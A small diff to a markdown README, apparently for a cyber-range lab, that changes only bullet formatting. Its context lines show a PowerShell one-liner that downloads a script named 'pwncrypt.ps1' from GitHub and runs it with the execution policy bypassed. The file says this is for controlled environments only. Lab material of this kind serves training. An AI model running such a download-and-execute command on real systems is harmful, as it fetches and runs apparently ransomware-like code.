@@ -6,8 +6,8 @@
 - `Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1' -OutFile 'C:\programdata\pwncrypt.ps1';cmd /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\pwncrypt.ps1`
 
 ## What this script does:
-- Intended for use in controlled environments only.
-- This script performs two main actions:
+-Intended for use in controlled environments only.
+-This script performs two main actions:
 
     Downloads a PowerShell script:
     It uses Invoke-WebRequest to retrieve pwncrypt.ps1 from a GitHub URL and saves it to C:\programdata\pwncrypt.ps1.
